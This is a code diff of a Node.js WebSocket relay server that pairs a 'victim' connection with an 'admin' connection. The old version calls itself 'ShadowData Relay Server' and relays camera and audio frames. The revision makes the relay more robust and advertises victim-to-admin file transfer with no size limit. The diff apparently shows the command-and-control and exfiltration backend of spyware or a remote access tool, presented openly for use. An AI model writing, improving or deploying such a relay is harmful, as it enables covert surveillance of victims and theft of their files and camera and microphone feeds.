@@ -1,94 +1,373 @@
-const express = require('express');
-const { WebSocketServer, WebSocket } = require('ws');
-const http = require('http');
+
+const express = require("express");
+const http = require("http");
+const WebSocket = require("ws");
 
 const app = express();
 const server = http.createServer(app);
-const wss = new WebSocketServer({ server });
+
+// ============================================
+// CONFIGURATION
+// ============================================
+
+const PORT = process.env.PORT || 10000;
+
+// Maximum individual WebSocket message.
+// This is NOT the maximum total file size.
+const MAX_MESSAGE_SIZE = 2 * 1024 * 1024;
+
+// Maximum queued data per receiving socket.
+// Keeps memory usage bounded.
+const MAX_QUEUE_BYTES = 16 * 1024 * 1024;
+
+// Heartbeat interval
+const HEARTBEAT_INTERVAL = 30000;
+
+// ============================================
+// WEBSOCKET SERVER
+// ============================================
+
+const wss = new WebSocket.Server({
+    server,
+    maxPayload: MAX_MESSAGE_SIZE,
+    perMessageDeflate: false
+});
 
 let victimSocket = null;
 let adminSocket = null;
 
-app.get('/', (req, res) => {
-    res.send(`ShadowData Relay Server Active.<br>Victim Connected: ${!!victimSocket}<br>Admin Connected: ${!!adminSocket}`);
+// Outbound queues, one per receiving socket.
+const sendQueues = new WeakMap();
+
+// ============================================
+// HTTP STATUS ROUTE
+// ============================================
+
+app.get("/", (req, res) => {
+    res.json({
+        status: "online",
+        service: "WebSocket Relay Server",
+        victimConnected:
+            !!victimSocket &&
+            victimSocket.readyState === WebSocket.OPEN,
+        adminConnected:
+            !!adminSocket &&
+            adminSocket.readyState === WebSocket.OPEN,
+        fileTransfer: {
+            direction: "victim-to-admin",
+            totalFileSizeLimit: "No application-level limit",
+            chunkedTransfer: true,
+            serverStorage: false
+        }
+    });
 });
 
-// Heartbeat interval to keep Render WebSocket connections alive (Fixed interval syntax)
-const interval = setInterval(() => {
-    wss.clients.forEach((ws) => {
-        if (ws.isAlive === false) return ws.terminate();
-        ws.isAlive = false;
-        ws.ping();
-    });
-}, 30000); // Correctly passed as the second argument to setInterval
+// ============================================
+// SOCKET HELPERS
+// ============================================
 
-wss.on('connection', (ws, req) => {
-    ws.isAlive = true;
-    ws.on('pong', () => { ws.isAlive = true; });
+function isConnected(socket) {
+    return socket &&
+        socket.readyState === WebSocket.OPEN;
+}
 
-    const urlParams = new URLSearchParams(req.url.split('?')[1]);
-    const role = urlParams.get('role');
+function getSocket(role) {
+    return role === "victim"
+        ? victimSocket
+        : adminSocket;
+}
 
-    if (role === 'victim') {
-        if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
-            victimSocket.terminate();
-        }
-        victimSocket = ws;
-        console.log('>>> Victim connected successfully.');
-    } else if (role === 'admin') {
-        if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
-            adminSocket.terminate();
-        }
-        adminSocket = ws;
-        console.log('>>> Admin connected successfully.');
+function setSocket(role, socket) {
+    if (role === "victim") {
+        victimSocket = socket;
+    } else {
+        adminSocket = socket;
+    }
+}
+
+function clearSocket(role, socket) {
+    if (getSocket(role) === socket) {
+        setSocket(role, null);
+    }
+}
+
+// ============================================
+// SAFE MESSAGE QUEUE
+// ============================================
+
+function enqueueMessage(target, data, isBinary, sender) {
+
+    if (!isConnected(target)) {
+        return false;
     }
 
-    ws.on('message', (message) => {
-        const isBinary = Buffer.isBuffer(message);
-        const logContent = isBinary ? `[Binary/Frame Buffer: ${message.length} bytes]` : message.toString();
-        
-        // Avoid spamming logs with continuous audio/camera frame chunks
-        if (!logContent.startsWith('AUDIO_FRAME:') && !logContent.startsWith('CAMERA_FRAME:')) {
-            console.log(`Received message from [${role}]: ${logContent.substring(0, 100)}...`);
+    let queue = sendQueues.get(target);
+
+    if (!queue) {
+        queue = {
+            items: [],
+            queuedBytes: 0,
+            sending: false
+        };
+
+        sendQueues.set(target, queue);
+    }
+
+    const size = data.length;
+
+    // Prevent unlimited memory growth if the
+    // receiving client cannot keep up.
+    if (queue.queuedBytes + size > MAX_QUEUE_BYTES) {
+
+        console.warn(
+            "Outbound queue full. Closing slow sender."
+        );
+
+        if (isConnected(sender)) {
+            sender.close(1013, "Receiver is too slow");
         }
 
-        if (role === 'admin') {
-            if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
-                victimSocket.send(message);
-            } else {
-                console.log('-> ROUTING FAILED: Victim socket is null or not OPEN.');
-                if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
-                    adminSocket.send(JSON.stringify({ error: "Victim device is offline or disconnected." }));
-                }
+        return false;
+    }
+
+    queue.items.push({
+        data,
+        isBinary,
+        size
+    });
+
+    queue.queuedBytes += size;
+
+    processQueue(target, queue);
+
+    return true;
+}
+
+function processQueue(target, queue) {
+
+    if (queue.sending || !isConnected(target)) {
+        return;
+    }
+
+    const item = queue.items.shift();
+
+    if (!item) {
+        return;
+    }
+
+    queue.sending = true;
+
+    target.send(
+        item.data,
+        { binary: item.isBinary },
+        (error) => {
+
+            queue.sending = false;
+            queue.queuedBytes -= item.size;
+
+            if (error) {
+                console.error(
+                    "Message forwarding failed:",
+                    error.message
+                );
+
+                target.terminate();
+                return;
             }
-        } else if (role === 'victim') {
-            if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
-                adminSocket.send(message);
-            }
+
+            processQueue(target, queue);
         }
+    );
+}
+
+// ============================================
+// MESSAGE FORWARDING
+// ============================================
+
+function forwardMessage(sender, data, isBinary) {
+
+    const role = sender.role;
+
+    let receiver = null;
+
+    if (role === "victim") {
+        receiver = adminSocket;
+    } else if (role === "admin") {
+        receiver = victimSocket;
+    }
+
+    if (!isConnected(receiver)) {
+        return;
+    }
+
+    enqueueMessage(
+        receiver,
+        data,
+        isBinary,
+        sender
+    );
+}
+
+// ============================================
+// WEBSOCKET CONNECTION
+// ============================================
+
+wss.on("connection", (ws, req) => {
+
+    const url = new URL(
+        req.url,
+        `http://${req.headers.host || "localhost"}`
+    );
+
+    const role = url.searchParams.get("role");
+
+    // Validate role
+    if (role !== "victim" && role !== "admin") {
+
+        ws.close(1008, "Invalid role");
+
+        return;
+    }
+
+    ws.role = role;
+    ws.isAlive = true;
+
+    console.log(`${role} connected`);
+
+    // Replace any existing connection for this role.
+    const existingSocket = getSocket(role);
+
+    if (isConnected(existingSocket)) {
+        existingSocket.close(
+            1000,
+            "Replaced by a new connection"
+        );
+    }
+
+    setSocket(role, ws);
+
+    // ========================================
+    // HEARTBEAT
+    // ========================================
+
+    ws.on("pong", () => {
+        ws.isAlive = true;
     });
 
-    ws.on('close', () => {
-        if (ws === victimSocket) {
-            victimSocket = null;
-            console.log('XXX Victim disconnected.');
+    // ========================================
+    // MESSAGE HANDLING
+    // ========================================
+
+    ws.on("message", (data, isBinary) => {
+
+        if (!isConnected(ws)) {
+            return;
         }
-        if (ws === adminSocket) {
-            adminSocket = null;
-            console.log('XXX Admin disconnected.');
-        }
+
+        // File chunks are binary messages.
+        // The server forwards them without
+        // buffering the entire file or decoding
+        // the binary data.
+        forwardMessage(
+            ws,
+            data,
+            isBinary
+        );
     });
 
-    ws.on('error', (err) => {
-        console.error(`WebSocket error on [${role}]:`, err.message);
+    // ========================================
+    // ERROR HANDLING
+    // ========================================
+
+    ws.on("error", (error) => {
+
+        console.error(
+            `${role} socket error:`,
+            error.message
+        );
+    });
+
+    // ========================================
+    // DISCONNECTION
+    // ========================================
+
+    ws.on("close", (code, reason) => {
+
+        clearSocket(role, ws);
+
+        console.log(
+            `${role} disconnected:`,
+            code,
+            reason.toString()
+        );
     });
 });
 
-server.on('close', () => {
-    clearInterval(interval);
+// ============================================
+// HEARTBEAT MONITOR
+// ============================================
+
+const heartbeatTimer = setInterval(() => {
+
+    wss.clients.forEach((ws) => {
+
+        if (!ws.isAlive) {
+
+            console.log(
+                `${ws.role} heartbeat timeout`
+            );
+
+            ws.terminate();
+
+            return;
+        }
+
+        ws.isAlive = false;
+
+        if (isConnected(ws)) {
+            ws.ping();
+        }
+    });
+
+}, HEARTBEAT_INTERVAL);
+
+// ============================================
+// SERVER START
+// ============================================
+
+server.listen(PORT, () => {
+
+    console.log(
+        `WebSocket server running on port ${PORT}`
+    );
 });
 
-const PORT = process.env.PORT || 10000;
-server.listen(PORT, '0.0.0.0', () => {
-    console.log(`Server listening on port ${PORT}`);
-});
+// ============================================
+// GRACEFUL SHUTDOWN
+// ============================================
+
+function shutdown() {
+
+    console.log("Shutting down server...");
+
+    clearInterval(heartbeatTimer);
+
+    wss.clients.forEach((ws) => {
+        ws.close(1001, "Server shutting down");
+    });
+
+    wss.close(() => {
+
+        server.close(() => {
+            process.exit(0);
+        });
+    });
+
+    // Avoid hanging indefinitely during shutdown.
+    setTimeout(() => {
+        process.exit(1);
+    }, 10000).unref();
+}
+
+process.on("SIGTERM", shutdown);
+process.on("SIGINT", shutdown);
